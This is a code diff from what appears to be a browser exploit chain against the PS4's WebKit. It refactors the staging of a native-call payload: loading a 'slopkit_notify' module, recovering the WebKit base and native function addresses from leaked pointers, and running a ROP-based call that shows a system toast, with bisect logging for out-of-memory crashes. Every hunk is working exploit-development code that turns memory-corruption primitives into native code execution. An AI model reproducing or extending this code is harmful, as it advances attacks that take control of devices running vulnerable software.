@@ -88,7 +88,7 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js";
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830br";
+const BUILD_ID = "rw-20250830bs";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 getpid", title: "getpid — hook cell+0x30 default (13.52; ?hook=cell for poops +0)" },
@@ -286,6 +286,7 @@ let lkQuiet = false;
 let nativeQuiet = false;
 const notifyRetain = [];
 let notifyPrep = null;
+let notifySkModule = null;
 const SCAN_MARK_TAGS = /^(SCAN-|G5-|PIVOT-|LK-|NATIVE-)/;
 const _scanBytes = new Array(8);
 const _win16 = new Array(16);
@@ -4329,49 +4330,25 @@ function resolveWebkitBase(off, nativeFn) {
     return null;
 }
 
-/** Lazy pin @ Fire only — staged for OOM bisect. */
-async function ensureNotifyPrep(p, off) {
-    if (notifyPrep) return notifyPrep;
-    notifyStage("NOTIFY-F03", "dynamic import slopkit_notify");
-    const sk = await import("./slopkit_notify.js?v=" + BUILD_ID);
-    notifyStage("NOTIFY-F04", "read session bases");
+/** Session bases for notify pin (skip captureMainMf when cached). */
+function notifySessionBases(p, off) {
     let nativeFn = parseAddr(sessionStorage.getItem("wk-nativeFn"));
     let webkitBase = parseAddr(sessionStorage.getItem("wk-webkitBase"));
     if (!nativeFn || !webkitBase) {
-        notifyStage("NOTIFY-F05", "captureMainMfForPrep (heavy — OOM risk)");
-        try {
-            const cap = captureMainMfForPrep(p, off);
-            nativeFn = cap.nativeFn;
-            webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
-            persistSessionBases(nativeFn, webkitBase, { trust: "rw" });
-            notifyStage("NOTIFY-F05-OK", "nativeFn=" + nativeFn);
-        } catch (err) {
-            mark("NOTIFY-PREP-SKIP", "base: " + (err.message || String(err)));
-            return null;
-        }
-    } else {
-        notifyStage("NOTIFY-F05-SKIP", "bases cached fn=" + nativeFn);
+        notifyStage("NOTIFY-F05", "captureMainMfForPrep");
+        const cap = captureMainMfForPrep(p, off);
+        nativeFn = cap.nativeFn;
+        webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
+        persistSessionBases(nativeFn, webkitBase, { trust: "rw" });
     }
-    notifyStage("NOTIFY-F06", "pinNotifyHeap");
-    notifyPrep = sk.pinNotifyHeap({
-        p,
-        off,
-        leakval: p.leakval,
-        webkitBase,
-        nativeFn,
-        retain: notifyRetain,
-        params,
-        log: notifyStage,
-        flush: function () {
-            renderOut();
-            try { crashLog.flushSync(); } catch (_) { }
-        },
-        bufAddrOff: null,
-    });
-    for (let i = 0; i < notifyRetain.length; i++)
-        retained.push(notifyRetain[i]);
-    notifyStage("NOTIFY-F07", "pin complete");
-    return notifyPrep;
+    return { nativeFn, webkitBase };
+}
+
+async function loadNotifySk() {
+    if (notifySkModule) return notifySkModule;
+    notifyStage("NOTIFY-F03", "import slopkit_notify");
+    notifySkModule = await import("./slopkit_notify.js?v=" + BUILD_ID);
+    return notifySkModule;
 }
 
 /** Capture expm1 + slab once at PRIMITIVE-OK — before any other taps eat heap. */
@@ -5212,27 +5189,38 @@ async function runFireNotify() {
 
         notifyStage("NOTIFY-F02b", "freeHeapBeforeNotifyFire");
         freeHeapBeforeNotifyFire();
-        if (notifyPrep && notifyPrep.arenaMode !== true)
-            notifyPrep = null;
+        notifyPrep = null;
 
-        if (!notifyPrep) {
-            await ensureNotifyPrep(p, off);
-            if (!notifyPrep) {
-                mark("NOTIFY-FAIL", "pin failed before S14");
-                state("pin failed — check last NOTIFY-S* stage", "bad");
-                return;
-            }
-        } else {
-            notifyStage("NOTIFY-F06-SKIP", "reuse pinned prep");
+        const sk = await loadNotifySk();
+        let bases;
+        try {
+            bases = notifySessionBases(p, off);
+        } catch (err) {
+            mark("NOTIFY-FAIL", "bases: " + (err.message || String(err)));
+            state("bases failed", "bad");
+            return;
         }
-
-        const sk = await import("./slopkit_notify.js?v=" + BUILD_ID);
-        notifyStage("NOTIFY-F08", "fireNotifyPinned");
         const fireFlush = function () {
             renderOut();
             try { crashLog.flushSync(); } catch (_) { }
         };
-        const out = sk.fireNotifyPinned(p, notifyPrep, lk, off, notifyStage, { flush: fireFlush });
+        notifyStage("NOTIFY-F09", "runNotifyAtomic sync pin+fire");
+        const out = sk.runNotifyAtomic({
+            p,
+            off,
+            lk,
+            leakval: p.leakval,
+            webkitBase: bases.webkitBase,
+            nativeFn: bases.nativeFn,
+            retain: notifyRetain,
+            params,
+            log: notifyStage,
+            flush: fireFlush,
+            carrier: window._wkCarrier || null,
+        });
+        for (let i = 0; i < notifyRetain.length; i++)
+            retained.push(notifyRetain[i]);
+        notifyPrep = { arenaMode: true };
         if (out.sent) {
             mark("NOTIFY-OK", "system toast result=0 build=" + BUILD_ID);
             state("notification sent — check PS4 toast", "ok");
@@ -5250,7 +5238,7 @@ async function runFireNotify() {
     } catch (err) {
         const em = err && err.message ? err.message : String(err);
         mark("NOTIFY-FAIL", em + " build=" + BUILD_ID);
-        mark("NOTIFY-HINT", "OOM? use index_notify.html — RE gd ?gd=0x…");
+        mark("NOTIFY-HINT", "S25 OOM: ?notifysmoke=usleep or ?notifybisect=1 — RE gd ?gd=0x…");
         state("notify failed: " + em.slice(0, 60), "bad");
         try {
             crashLog.append("NOTIFY-FAIL " + em, "NOTIFY-FAIL");
@@ -5592,7 +5580,8 @@ async function runStart() {
         const nm = getNativeMode();
         try {
             if (nm === "notify" && params.get("prepslab") !== "1") {
-                mark("NATIVE-HINT", "notify — pin @ Fire only; OOM? use index_notify.html");
+                mark("NATIVE-HINT", "notify — Accept fn → Fire (atomic). S25? ?notifysmoke=usleep");
+                loadNotifySk().catch(function () { });
             } else {
                 ensureNativePrep(p, off);
                 mark("NATIVE-PREP", "slab ready @ Start build=" + BUILD_ID + " native=" + nm);
